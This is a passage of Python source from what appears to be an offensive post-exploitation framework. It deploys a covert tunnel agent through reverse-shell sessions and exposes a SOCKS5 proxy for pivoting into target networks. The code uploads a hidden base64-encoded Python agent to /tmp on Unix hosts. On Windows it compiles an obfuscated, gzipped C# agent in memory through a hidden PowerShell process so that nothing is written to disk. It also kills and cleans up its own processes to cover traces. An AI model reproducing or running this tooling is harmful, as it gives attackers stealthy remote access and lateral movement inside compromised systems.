        if len(alive) == 1:
            return alive[0], alive[0]
        ranked = sorted(alive, key=lambda c: self._channel_load_value(c))
        up = ranked[0]
        down = ranked[1] if ranked[1] is not up else ranked[0]
        if up is down and len(ranked) > 2:
            down = ranked[2]
        with self._lock:
            self._channel_rr[client_sock] = self._channel_rr.get(client_sock, 0) + 2
        return up, down

    def _close_stream_on_agent(self, client_sock, sid, preferred=None):
        resp, _ = self._channel_request(
            client_sock, {'op': 'close', 'sid': sid}, timeout=3.0, preferred=preferred,
        )
        return resp

    def _wait_for_channel(self, client_sock, token, timeout=30.0):
        ready = self._channel_ready.get(token)
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self._has_channels(client_sock):
                return True
            if ready and ready.wait(timeout=min(0.2, max(deadline - time.time(), 0))):
                if self._has_channels(client_sock):
                    return True
        return self._has_channels(client_sock)

    def _request_on(self, conn, message, timeout=30.0):
        """Send one JSON request; return (response, hard_fail)."""
        worker = self._conn_worker(conn)
        if not worker or not worker.alive():
            return None, True

        def op():
            try:
                conn.settimeout(timeout)
                _send_json(conn, message)
                resp, hard_fail = _read_frame(conn, timeout=timeout)
                return resp, hard_fail
            except socket.timeout:
                return None, False
            except OSError:
                return None, True
            finally:
                try:
                    conn.settimeout(None)
                except OSError:
                    pass

        return worker.submit(op, timeout=timeout + 5.0)

    def _send_bulk(self, conn, sid, data, timeout=RELAY_ACTIVE_TIMEOUT):
        worker = self._conn_worker(conn)
        if not worker or not worker.alive():
            return False, True

        def op():
            try:
                body = struct.pack('>BI', FRAME_SEND, sid) + data
                conn.settimeout(timeout)
                conn.sendall(struct.pack('>I', len(body)) + body)
                resp, hard_fail = _read_frame(conn, timeout=timeout)
                if resp is None:
                    return False, hard_fail
                return bool(resp.get('ok')), False
            except socket.timeout:
                return False, False
            except OSError:
                return False, True
            finally:
                try:
                    conn.settimeout(None)
                except OSError:
                    pass

        result = worker.submit(op, timeout=timeout + 5.0)
        if result is None:
            return False, False
        return result

    def _recv_bulk(self, conn, sid, max_bytes=RELAY_CHUNK, timeout=RELAY_IDLE_TIMEOUT):
        worker = self._conn_worker(conn)
        if not worker or not worker.alive():
            return b'', False, True

        def op():
            try:
                body = struct.pack('>BII', FRAME_RECV_REQ, sid, max_bytes)
                conn.settimeout(timeout)
                conn.sendall(struct.pack('>I', len(body)) + body)
                resp, hard_fail = _read_frame(conn, timeout=timeout)
                if resp is None:
                    return b'', False, hard_fail
                if resp.get('op') == '_recvb':
                    return resp.get('data', b''), bool(resp.get('closed')), False
                if resp.get('ok'):
                    chunk = base64.b64decode(resp.get('data', '') or '')
                    return chunk, bool(resp.get('closed')), False
                return b'', bool(resp.get('closed')), False
            except socket.timeout:
                return b'', False, False
            except OSError:
                return b'', False, True
            finally:
                try:
                    conn.settimeout(None)
                except OSError:
                    pass

        result = worker.submit(op, timeout=timeout + 5.0)
        if result is None:
            return b'', False, False
        return result

    def _channel_request(self, client_sock, message, timeout=30.0, preferred=None):
        tried = set()
        candidates = []
        if preferred is not None and self._conn_alive(preferred):
            candidates.append(preferred)
        for _ in range(TUNNEL_POOL_SIZE):
            ch = self._pick_channel(client_sock)
            if ch and id(ch) not in tried:
                candidates.append(ch)
                tried.add(id(ch))
        for conn in candidates:
            resp, hard_fail = self._request_on(conn, message, timeout=timeout)
            if resp is not None:
                return resp, conn
            if hard_fail:
                self._remove_conn(client_sock, conn)
        return None, None

    def _next_id(self, prefix):
        with self._lock:
            self._counter += 1
            return f"{prefix}{self._counter}"

    def _next_stream_id(self, client_sock):
        with self._lock:
            sid = self._session_stream_counters.get(client_sock, 0) + 1
            self._session_stream_counters[client_sock] = sid
            return sid

    def _deploy_lock(self, client_sock):
        with self._lock:
            if client_sock not in self._deploy_locks:
                self._deploy_locks[client_sock] = threading.Lock()
            return self._deploy_locks[client_sock]

    def _log(self, client_sock, message):
        logger = self.h._get_session_logger(client_sock)
        if logger:
            logger.log_tunnel(message)

    def _agent_token(self, client_sock):
        info = self.h._client_info(client_sock)
        return f"s{info['id']}" if info else None

    def _check_python(self, client_sock, shell_type, timeout=15.0):
        start = TUNNEL_MARK_START
        end = TUNNEL_MARK_END
        
        if shell_type == 'windows':
            # PowerShell: run python -c and print marker
            ps_cmd = (
                f"$py=(Get-Command python -ErrorAction SilentlyContinue).Source;"
                f"if(-not $py){{$py=(Get-Command python3 -ErrorAction SilentlyContinue).Source}};"
                f"if($py){{& $py -c \"print('{start}PYTHON_OK{end}')\"}}else{{Write-Output '{start}NO_PYTHON{end}'}}"
            )
            result = self._tunnel_marked(client_sock, '', ps_cmd, 'windows', timeout=timeout)
        else:
            # Linux: run python -c and print marker
            sh_cmd = (
                f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null);"
                f"if [ -n \"$PY\" ]; then \"$PY\" -c \"print('{start}PYTHON_OK{end}')\"; else printf '{start}NO_PYTHON{end}'; fi"
            )
            result = self._tunnel_marked(client_sock, sh_cmd, '', 'unix', timeout=timeout)
        
        # If result is None, we assume Python is not available or command failed
        if result is None:
            return False
        
        return result.strip() == 'PYTHON_OK'

    def _set_error(self, message):
        self._last_error = message

    def _tunnel_marked(self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0, strip_ws=True):
        return self.h._run_marked(
            client_sock, unix_cmd, win_ps_script, shell_type, timeout=timeout,
            start_mark=TUNNEL_MARK_START, end_mark=TUNNEL_MARK_END, strip_ws=strip_ws,
        )

    def _remote_paths(self, client_sock, shell_type, token):
        return f"/tmp/.tornado_agent_{token}.py"

    def _upload_agent(self, client_sock, agent_path, shell_type, handler_ip=None):
        """Upload the Unix Python agent to the remote target via base64."""
        data = _REMOTE_AGENT_SOURCE.encode('utf-8')
        b64 = base64.b64encode(data).decode('ascii')
        sh_cmd = (
            f"echo '{b64}' | base64 -d > '{agent_path}' 2>/dev/null && "
            f"printf '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
        )
        result = self._tunnel_marked(client_sock, sh_cmd, '', 'unix', timeout=30.0)
        return result == 'OK'

    def _build_windows_launcher_ps(self, host, port, token):
        marker = f"TNB_{token}"

        code = (
            "$ErrorActionPreference='Stop';"
            "try{"
            "Add-Type -TypeDefinition ((New-Object IO.StreamReader("
            "(New-Object IO.Compression.GZipStream("
            f"(New-Object IO.MemoryStream(,[Convert]::FromBase64String('{_CS_GZ_B64}'))),"
            "[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()) "
            "-Language CSharp;"
            f"[TornadoTunnel]::Run('{host}',{port},'{token}')"
            "}catch{"
            "$m=($_|Out-String);"
            "[Console]::Error.WriteLine('TNB_ERR '+$m);"
            "try{$m|Out-File $env:TNBERR -EA SilentlyContinue}catch{};"
            "exit 1"
            "}"
        )

        code_b64 = base64.b64encode(code.encode('utf-8')).decode('ascii')

        child_args = "-NoProfile -NonInteractive -Command iex $env:TNBCODE"

        outer_ps = (
            f"$env:TNBCODE=[Text.Encoding]::UTF8.GetString("
            f"[Convert]::FromBase64String('{code_b64}'));"
            f"$env:TNBERR=Join-Path $env:TEMP 'tnb_err_{token}.txt';"
            f"Remove-Item $env:TNBERR -EA SilentlyContinue;"
            f"$m='{marker}';"
            f"Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" -EA SilentlyContinue "
            f"| Where-Object {{ $_.CommandLine -and $_.CommandLine.Contains($m) }} "
            f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue }};"
            f"$si=New-Object Diagnostics.ProcessStartInfo;"
            f"$si.FileName='powershell.exe';"
            f"$si.Arguments='{child_args}';"
            f"$si.UseShellExecute=$false;"
            f"$si.CreateNoWindow=$true;"
            f"$si.RedirectStandardError=$true;"
            f"$si.RedirectStandardOutput=$true;"
            f"$p=[Diagnostics.Process]::Start($si);"
            f"$errTask=$p.StandardError.ReadToEndAsync();"
            f"$outTask=$p.StandardOutput.ReadToEndAsync();"
            f"Start-Sleep -Milliseconds 5000;"
            f"if($p.HasExited){{"
            f"  $err='';try{{$err=$errTask.Result}}catch{{}};"
            f"  $out='';try{{$out=$outTask.Result}}catch{{}};"
            f"  $d='exited='+$p.ExitCode;"
            f"  if($err){{$d+=' err='+($err -replace '\\s+',' ')}}"
            f"  elseif($out){{$d+=' out='+($out -replace '\\s+',' ')}};"
            f"  if(Test-Path $env:TNBERR){{"
            f"    $r=Get-Content $env:TNBERR -Raw -EA SilentlyContinue;"
            f"    if($r -and -not $err){{$d+=' file='+($r -replace '\\s+',' ')}}"
            f"  }};"
            f"  Write-Output ('{TUNNEL_MARK_START}FAIL:'+$d+'{TUNNEL_MARK_END}')"
            f"}}else{{"
            f"  Write-Output '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
            f"}}"
        )
        return outer_ps

    def _deploy_agent(self, client_sock):
        cached = self._session_agents.get(client_sock)
        if cached and cached.get('ready') and cached.get('ver') == AGENT_VERSION and self._has_channels(client_sock):
            return cached

        info = self.h._client_info(client_sock)
        if not info:
            self._set_error('session not active')
            return None

        self._ensure_tunnel_listener()
        shell_type = info.get('type', 'unix')
        if shell_type != 'windows' and not self._check_python(client_sock, shell_type):
            self._set_error('Python is not installed on the remote host')
            self._log(client_sock, 'Tunnel aborted: Python missing')
            print(f"{self.h.colors['red']}Python not found on target – tunnel cannot start, use ligolong/chisel plugin instead{self.h.colors['end']}")
            return None
        handler_ip = client_sock.getsockname()[0]
        token = self._agent_token(client_sock)
        tunnel_port = self._tunnel_port
        revshell_port = int(self.h.revshell_port)
        token_esc = token.replace("'", "'\\''")
        print(f"Using handler IP: {handler_ip}")
        print(f"Tunnel port: {tunnel_port}")

        self._token_sessions[token] = client_sock
        ready = threading.Event()
        self._channel_ready[token] = ready
        ready.clear()
        self._drop_pool(client_sock)

        if shell_type == 'windows':
            # ---- Windows: in-memory C# agent via Add-Type, no disk artifact ----
            print(f"{self.h.colors['cyan']}Windows: in-memory C# tunnel agent{self.h.colors['end']}")
            launcher = self._build_windows_launcher_ps(handler_ip, tunnel_port, token)
            payload = self._tunnel_marked(client_sock, '', launcher, 'windows', timeout=45.0)
        else:
            # ---- Linux/Unix: unchanged Python agent on disk ----
            agent_path = self._remote_paths(client_sock, shell_type, token)
            path_esc = self.h._escape_path(agent_path, shell_type)
            print(f"Agent path: {agent_path}")
            if not self._upload_agent(client_sock, agent_path, shell_type):
                print(f"{self.h.colors['red']}Upload failed: {self._last_error}{self.h.colors['end']}")
                return None
            unix_cmd = (
                f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null); "
                f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
                f"nohup \"$PY\" '{path_esc}' '{handler_ip}' {tunnel_port} '{token_esc}' {revshell_port} >/dev/null 2>&1 & "
                f"printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
            )
            payload = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=25.0)

        if payload == 'NO_PYTHON':
            self._set_error('Python not installed on remote host')
            return None
        if payload != 'OK':
            if payload and payload.startswith('FAIL:'):
                detail = payload[5:].strip() or 'unknown failure'
                self._set_error(f'tunnel agent failed to start — {detail}')
                print(
                    f"{self.h.colors['red']}Tunnel agent failed: "
                    f"{detail}{self.h.colors['end']}"
                )
            else:
                self._set_error('tunnel agent failed to start')
            return None
        if not self._wait_for_channel(client_sock, token, timeout=60.0):
            self._set_error(f'agent did not connect to handler port {tunnel_port}')
            return None

        agent = {
            'token': token,
            'ready': True,
            'remote_path': agent_path if shell_type != 'windows' else None,
            'transport': 'cs-mem' if shell_type == 'windows' else 'py-disk',
            'ver': AGENT_VERSION,
        }
        self._session_agents[client_sock] = agent
        self._last_error = ''
        n = len(self._alive_conns(client_sock))
        self._log(client_sock, f"Tunnel ready: {n} channel(s) on port {tunnel_port}")
        self._start_keepalive(client_sock, agent)
        return agent

    def _start_keepalive(self, client_sock, agent):
        def loop():
            gc_counter = 0
            while (
                client_sock in self.h.revshell_clients
                and self._session_agents.get(client_sock) is agent
            ):
                time.sleep(30)
                if not self._has_channels(client_sock):
                    self._wait_for_channel(client_sock, agent['token'], timeout=10.0)
                    continue
                self._channel_request(client_sock, {'op': 'ping'}, timeout=10.0)
                gc_counter += 1
                if gc_counter >= 4:
                    gc_counter = 0
                    self._channel_request(client_sock, {'op': 'gc'}, timeout=10.0)
        threading.Thread(target=loop, daemon=True).start()

    def _agent_request(self, client_sock, message, timeout=30.0, preferred=None):
        agent = self._session_agents.get(client_sock)
        if not agent or not agent.get('ready'):
            with self._deploy_lock(client_sock):
                agent = self._session_agents.get(client_sock)
                if not agent or not agent.get('ready'):
                    agent = self._deploy_agent(client_sock)
        if not agent:
            return None
        if not self._has_channels(client_sock):
            self._wait_for_channel(client_sock, agent['token'], timeout=10.0)
        resp, conn = self._channel_request(
            client_sock, message, timeout=timeout, preferred=preferred,
        )
        if resp is not None:
            return resp
        self._wait_for_channel(client_sock, agent['token'], timeout=8.0)
        resp, _ = self._channel_request(client_sock, message, timeout=timeout)
        return resp

    def _cleanup_remote_tunnel_artifacts(self, client_sock, reason='cleanup'):
        agent = self._session_agents.get(client_sock)
        info = self.h._client_info(client_sock)
        if not agent and not info:
            self._drop_pool(client_sock)
            return False

        shell_type = (info or {}).get('type', 'unix')
        token = (agent or {}).get('token') or self._agent_token(client_sock)
        if not token:
            self._drop_pool(client_sock)
            return False

        result = None
        for _attempt in range(2):
            if shell_type == 'windows':
                marker = f"TNB_{token}"
                cleanup_ps = (
                    f"$m='{marker}'; "
                    f"Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" "
                    f"| Where-Object {{ $_.CommandLine -and $_.CommandLine.Contains($m) }} "
                    f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force "
                    f"-ErrorAction SilentlyContinue }}; "
                    f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
                )
                result = self._tunnel_marked(
                    client_sock, '', cleanup_ps, 'windows', timeout=20.0
                )
            else:
                agent_path = (agent or {}).get('remote_path') or self._remote_paths(
                    client_sock, shell_type, token
                )
                path_esc = self.h._escape_path(agent_path, shell_type)
                token_esc = token.replace("'", "'\\''")
                unix_cmd = (
                    f"pkill -9 -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
                    f"rm -f '{path_esc}' 2>/dev/null; "
                    f"printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
                )
                result = self._tunnel_marked(
                    client_sock, unix_cmd, '', shell_type, timeout=20.0
                )
            if result == 'OK':
                break
            time.sleep(0.5)

        self._drop_pool(client_sock)
        with self._lock:
            self._session_agents.pop(client_sock, None)
            self._token_sessions.pop(token, None)
            self._channel_ready.pop(token, None)
            self._session_stream_counters.pop(client_sock, None)
            self._session_reset_gen.pop(client_sock, None)
            self._active_relays.pop(client_sock, None)
            self._relay_sems.pop(client_sock, None)
            self._deploy_locks.pop(client_sock, None)

        ok = result == 'OK'
        msg = (
            f"Remote tunnel cleanup ({reason}): "
            f"{'removed' if ok else (result or 'no response')}"
        )
        color = self.h.colors['green'] if ok else self.h.colors['yellow']
        print(f"{color}{msg}{self.h.colors['end']}")
        self._log(client_sock, msg)
        return ok

    def cleanup_session(self, client_sock):
        for pid, p in list(self._proxies.items()):
            if p.get('client_sock') == client_sock:
                self._stop_proxy(pid, reason='session disconnected', cleanup_remote=False)
        self._bump_reset_gen(client_sock)
        self._abort_session_relays(client_sock, timeout=RELAY_JOIN_TIMEOUT)
        self._purge_all_channels(client_sock, timeout=5.0)
        self._cleanup_remote_tunnel_artifacts(client_sock, reason='session disconnected')

    def start_socks(self, client_sock, listen_port):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return False
        try:
            listen_port = int(listen_port)
        except ValueError:
            print(f"{self.h.colors['red']}Invalid port{self.h.colors['end']}")
            return False

        if not self._agent_request(client_sock, {'op': 'ping'}, timeout=25.0):
            print(f"{self.h.colors['red']}Failed to start tunnel: {self._last_error or 'no response'}{self.h.colors['end']}")
            return False

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind(('127.0.0.1', listen_port))
            listener.listen(512)
        except OSError as exc:
            listener.close()
            print(f"{self.h.colors['red']}Cannot bind 127.0.0.1:{listen_port}: {exc}{self.h.colors['end']}")
            return False

        proxy_id = self._next_id('socks')
        stop_event = threading.Event()
        proxy = {
            'id': proxy_id, 'client_sock': client_sock, 'session_id': info['id'],
            'listen_port': listen_port, 'listener': listener, 'stop_event': stop_event,
        }
        with self._lock:
            self._proxies[proxy_id] = proxy

        def accept_loop():
            sem = self._relay_sem(client_sock)
            while not stop_event.is_set():
                try:
                    listener.settimeout(1.0)
                    try:
                        conn, _ = listener.accept()
                    except socket.timeout:
                        continue
                    if not sem.acquire(blocking=False):
                        try:
                            conn.close()
                        except OSError:
                            pass
                        continue
                    _set_keepalive(conn)
                    threading.Thread(
                        target=self._handle_socks_client,
                        args=(client_sock, conn, sem),
                        daemon=True,
                    ).start()
                except OSError:
                    break

        threading.Thread(target=accept_loop, daemon=True).start()
        n = len(self._alive_conns(client_sock))
        print(f"{self.h.colors['green']}SOCKS5 {proxy_id}: 127.0.0.1:{listen_port} via #{info['id']} ({n} ch){self.h.colors['end']}")
        print(f"{self.h.colors['cyan']}  proxychains: proxy_dns + socks5 127.0.0.1 {listen_port}{self.h.colors['end']}")
        print(f"{self.h.colors['cyan']}  test reachability: socks test <host> <port>{self.h.colors['end']}")
        return True

    def _purge_all_channels(self, client_sock, timeout=10.0):
        """Broadcast purge to every live channel so all agent workers clear state."""
        ok = False
        for conn in self._alive_conns(client_sock):
            resp, hard_fail = self._request_on(conn, {'op': 'purge'}, timeout=timeout)
            if resp and resp.get('ok'):
                ok = True
            elif hard_fail:
                self._remove_conn(client_sock, conn)
        return ok

    def _gc_all_channels(self, client_sock, timeout=5.0):
        for conn in self._alive_conns(client_sock):
            resp, hard_fail = self._request_on(conn, {'op': 'gc'}, timeout=timeout)
            if hard_fail:
                self._remove_conn(client_sock, conn)

    def _drain_channel_workers(self, client_sock):
        for conn in self._alive_conns(client_sock):
            worker = self._conn_worker(conn)
            if worker:
                worker.drain()

    def _socks_reset(self, client_sock, hard=False):
        """Soft reset: purge streams, abort relays, reset counters and load balancers.
        Hard reset: kill and redeploy the remote agent for a fresh state."""
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return True

        if hard:
            return self._socks_reset_hard(client_sock)

        if not self._has_channels(client_sock):
            print(
                f"{self.h.colors['red']}No active tunnel channels for "
                f"#{info['id']}{self.h.colors['end']}"
            )
            return True

        self._bump_reset_gen(client_sock)
        self._abort_session_relays(client_sock, timeout=RELAY_JOIN_TIMEOUT)
        self._drain_channel_workers(client_sock)

        with self._lock:
            self._session_stream_counters[client_sock] = 0
            self._channel_rr[client_sock] = 0
            for conn in self._alive_conns(client_sock):
                self._channel_load[id(conn)] = 0

        ok = self._purge_all_channels(client_sock, timeout=10.0)
        self._gc_all_channels(client_sock, timeout=5.0)

        ping_ok = False
        for conn in self._alive_conns(client_sock):
            resp, hard_fail = self._request_on(conn, {'op': 'ping'}, timeout=5.0)
            if resp and resp.get('ok'):
                ping_ok = True
            elif hard_fail:
                self._remove_conn(client_sock, conn)

        healthy = self._alive_conns(client_sock)
        if len(healthy) < max(1, TUNNEL_POOL_SIZE // 4):
            agent = self._session_agents.get(client_sock) or {}
            self._wait_for_channel(client_sock, agent.get('token', ''), timeout=15.0)
            healthy = self._alive_conns(client_sock)

        n = len(healthy)
        if ok and ping_ok and n > 0:
            print(
                f"{self.h.colors['green']}Tunnel reset OK for #{info['id']} "
                f"({n} channel(s) clean, streams purged, buffers cleared)"
                f"{self.h.colors['end']}"
            )
            self._log(client_sock, f'SOCKS tunnel reset: {n} channel(s) clean')
        else:
            err = self._last_error or 'partial reset'
            color = self.h.colors['yellow'] if n else self.h.colors['red']
            print(
                f"{color}Tunnel reset {'partial' if n else 'failed'} for "
                f"#{info['id']}: {n} channel(s) remaining{self.h.colors['end']}"
            )
            self._log(
                client_sock,
                f'SOCKS tunnel reset {"partial" if n else "failed"}: {err}'
            )
        return True

    def _socks_reset_hard(self, client_sock):
        """Kill and redeploy the remote agent for a completely fresh tunnel state."""
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return True

        print(
            f"{self.h.colors['yellow']}Hard reset: redeploying tunnel agent "
            f"for #{info['id']}...{self.h.colors['end']}"
        )

        self._bump_reset_gen(client_sock)
        self._abort_session_relays(client_sock, timeout=RELAY_JOIN_TIMEOUT)
        self._purge_all_channels(client_sock, timeout=5.0)
        self._drop_pool(client_sock)

        with self._lock:
            self._session_agents.pop(client_sock, None)
            self._session_stream_counters[client_sock] = 0
            self._session_reset_gen[client_sock] = 0

        with self._deploy_lock(client_sock):
            agent = self._deploy_agent(client_sock)

        if not agent:
            print(
                f"{self.h.colors['red']}Hard reset failed: "
                f"{self._last_error or 'agent redeploy failed'}{self.h.colors['end']}"
            )
            self._log(client_sock, 'SOCKS hard reset failed: agent redeploy failed')
            return True

        n = len(self._alive_conns(client_sock))
        print(
            f"{self.h.colors['green']}Hard reset OK for #{info['id']} "
            f"({n} fresh channel(s)){self.h.colors['end']}"
        )
        self._log(client_sock, f'SOCKS hard reset: {n} fresh channel(s)')
        return True

    def _socks_test(self, client_sock, host, port):
        try:
            port = int(port)
        except (TypeError, ValueError):
            print(f"{self.h.colors['red']}Invalid port{self.h.colors['end']}")
            return True

        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return True

        with self._lock:
            proxy = next(
                (p for p in self._proxies.values()
                 if p.get('client_sock') is client_sock),
                None,
            )
        agent = self._session_agents.get(client_sock)
        if proxy is None or not agent or not agent.get('ready'):
            print(
                f"{self.h.colors['yellow']}No SOCKS5 proxy is running for "
                f"#{info['id']}. Start one first:{self.h.colors['end']}"
            )
            print(
                f"{self.h.colors['cyan']}  from main menu : socks {info['id']} <listen_port>"
                f"{self.h.colors['end']}"
            )
            print(
                f"{self.h.colors['cyan']}  inside session : socks <listen_port>"
                f"{self.h.colors['end']}"
            )
            return True

        if not self._has_channels(client_sock):
            self._wait_for_channel(client_sock, agent['token'], timeout=8.0)
            if not self._has_channels(client_sock):
                print(
                    f"{self.h.colors['red']}SOCKS proxy {proxy['id']} has no live "
                    f"tunnel channels — try 'socks reset' or restart the proxy"
                    f"{self.h.colors['end']}"
                )
                return True

        sid = self._next_stream_id(client_sock)
        started = time.time()
        resp, _conn = self._channel_request(
            client_sock,
            {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
            timeout=45.0,
        )
        elapsed = time.time() - started
        if resp and resp.get('ok'):
            print(
                f"{self.h.colors['green']}OK: {host}:{port} via #{info['id']} "
                f"({elapsed:.2f}s){self.h.colors['end']}"
            )
            self._log(client_sock, f"SOCKS test OK: {host}:{port} ({elapsed:.2f}s)")
            self._channel_request(
                client_sock, {'op': 'close', 'sid': sid}, timeout=5.0,
            )
        else:
            err = (resp or {}).get('error', self._last_error or 'no response')
            print(
                f"{self.h.colors['red']}FAIL: {host}:{port} via #{info['id']} — {err} "
                f"({elapsed:.2f}s){self.h.colors['end']}"
            )
            self._log(client_sock, f"SOCKS test FAIL: {host}:{port} — {err}")
        return True

    def _recv_exact(self, sock, n, timeout=10.0):
        data = b''
        end = time.time() + timeout
        while len(data) < n and time.time() < end:
            try:
                chunk = sock.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                continue
            except OSError:
                return None
        return data if len(data) == n else None

    def _write_to_client(self, conn, data, stop, timeout=30.0):
        """Write to a non-blocking local SOCKS client with backpressure."""
        offset = 0
        deadline = time.time() + timeout
        while offset < len(data) and not stop.is_set():
            try:
                sent = conn.send(data[offset:])
                if sent == 0:
                    return False
                offset += sent
            except BlockingIOError:
                remaining = deadline - time.time()
                if remaining <= 0:
                    return False
                _, writable, _ = select.select([], [conn], [], min(remaining, 0.25))
                if not writable:
                    continue
            except OSError:
                return False
        return offset == len(data)

    def _relay_reader(self, conn, send_queue, stop, reset_gen, client_sock):
        """Read from the local SOCKS client; pause when upload queue is full."""
        while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
            try:
                r, _, _ = select.select([conn], [], [], 0.25)
                if not r:
                    continue
                data = conn.recv(RELAY_CHUNK)
                if not data:
                    stop.set()
                    break
                while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
                    try:
                        send_queue.put(data, timeout=1.0)
                        break
                    except queue.Full:
                        continue
            except OSError:
                stop.set()
                break
        stop.set()

    def _relay_upload(self, client_sock, up_conn, sid, send_queue, stop, reset_gen):
        """Drain the upload queue to the tunnel agent."""
        while (
            not stop.is_set()
            and not self._relay_stale(client_sock, reset_gen)
            and self._conn_alive(up_conn)
        ):
            try:
                data = send_queue.get(timeout=0.5)
            except queue.Empty:
                continue
            if data is None:
                break
            ok, hard_fail = self._send_bulk(up_conn, sid, data)
            if not ok:
                if hard_fail:
                    self._remove_conn(client_sock, up_conn)
                stop.set()
                break
        stop.set()

    def _relay_download(self, client_sock, down_conn, sid, recv_queue, stop, reset_gen):
        """Poll agent for data and push into bounded download queue."""
        idle_rounds = 0
        had_data = False
        while (
            not stop.is_set()
            and not self._relay_stale(client_sock, reset_gen)
            and self._conn_alive(down_conn)
        ):
            data, closed, hard_fail = self._recv_bulk(
                down_conn, sid, RELAY_CHUNK,
                timeout=RELAY_ACTIVE_TIMEOUT if had_data else RELAY_IDLE_TIMEOUT,
            )
            if hard_fail:
                self._remove_conn(client_sock, down_conn)
                stop.set()
                break
            if data:
                while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
                    try:
                        recv_queue.put(data, timeout=1.0)
                        break
                    except queue.Full:
                        continue
                idle_rounds = 0
                had_data = True
            else:
                idle_rounds += 1
                if idle_rounds > MAX_IDLE_ROUNDS:
                    stop.set()
                    break
            if closed:
                stop.set()
                break
        stop.set()

    def _relay_writer(self, conn, recv_queue, stop, reset_gen, client_sock):
        """Drain download queue to local SOCKS client with write backpressure."""
        while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
            try:
                data = recv_queue.get(timeout=0.5)
            except queue.Empty:
                continue
            if data is None:
                break
            if not self._write_to_client(conn, data, stop):
                stop.set()
                break
        stop.set()

    def _relay_single(self, client_sock, tunnel_conn, sid, conn, reset_gen, handle):
        stop = handle.stop
        send_queue = queue.Queue(maxsize=UPLOAD_QUEUE_SIZE)
        recv_queue = queue.Queue(maxsize=DOWNLOAD_QUEUE_SIZE)
        handle.send_queue = send_queue
        handle.recv_queue = recv_queue
        threads = [
            threading.Thread(
                target=self._relay_reader,
                args=(conn, send_queue, stop, reset_gen, client_sock),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_upload,
                args=(client_sock, tunnel_conn, sid, send_queue, stop, reset_gen),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_download,
                args=(client_sock, tunnel_conn, sid, recv_queue, stop, reset_gen),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_writer,
                args=(conn, recv_queue, stop, reset_gen, client_sock),
                daemon=True,
            ),
        ]
        handle.threads = threads
        self._inc_channel_load(tunnel_conn, 2)
        try:
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
        finally:
            self._inc_channel_load(tunnel_conn, -2)
            stop.set()
            for q in (send_queue, recv_queue):
                while True:
                    try:
                        q.put_nowait(None)
                    except queue.Full:
                        break
                while True:
                    try:
                        q.get_nowait()
                    except queue.Empty:
                        break
            preferred = tunnel_conn if self._conn_alive(tunnel_conn) else None
            self._close_stream_on_agent(client_sock, sid, preferred=preferred)

    def _relay(self, client_sock, up_conn, down_conn, sid, conn, reset_gen, handle):
        """Full-duplex bulk relay; falls back to single-channel mode when needed."""
        if up_conn is down_conn:
            self._relay_single(client_sock, up_conn, sid, conn, reset_gen, handle)
            return

        stop = handle.stop
        send_queue = queue.Queue(maxsize=UPLOAD_QUEUE_SIZE)
        recv_queue = queue.Queue(maxsize=DOWNLOAD_QUEUE_SIZE)
        handle.send_queue = send_queue
        handle.recv_queue = recv_queue
        self._inc_channel_load(up_conn, 1)
        self._inc_channel_load(down_conn, 1)
        threads = [
            threading.Thread(
                target=self._relay_reader,
                args=(conn, send_queue, stop, reset_gen, client_sock),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_upload,
                args=(client_sock, up_conn, sid, send_queue, stop, reset_gen),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_download,
                args=(client_sock, down_conn, sid, recv_queue, stop, reset_gen),
                daemon=True,
            ),
            threading.Thread(
                target=self._relay_writer,
                args=(conn, recv_queue, stop, reset_gen, client_sock),
                daemon=True,
            ),
        ]
        handle.threads = threads
        try:
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
        finally:
            self._inc_channel_load(up_conn, -1)
            self._inc_channel_load(down_conn, -1)
            stop.set()
            for q in (send_queue, recv_queue):
                while True:
                    try:
                        q.put_nowait(None)
                    except queue.Full:
                        break
                while True:
                    try:
                        q.get_nowait()
                    except queue.Empty:
                        break
            preferred = up_conn if self._conn_alive(up_conn) else down_conn
            self._close_stream_on_agent(client_sock, sid, preferred=preferred)

    def _conn_alive(self, conn):
        try:
            return conn.fileno() != -1
        except OSError:
            return False

    def _handle_socks_client(self, client_sock, conn, relay_sem=None):
        sid = None
        tunnel_conn = None
        handle = None
        reset_gen = self._reset_gen(client_sock)
        try:
            conn.settimeout(15.0)
            greeting = self._recv_exact(conn, 2)
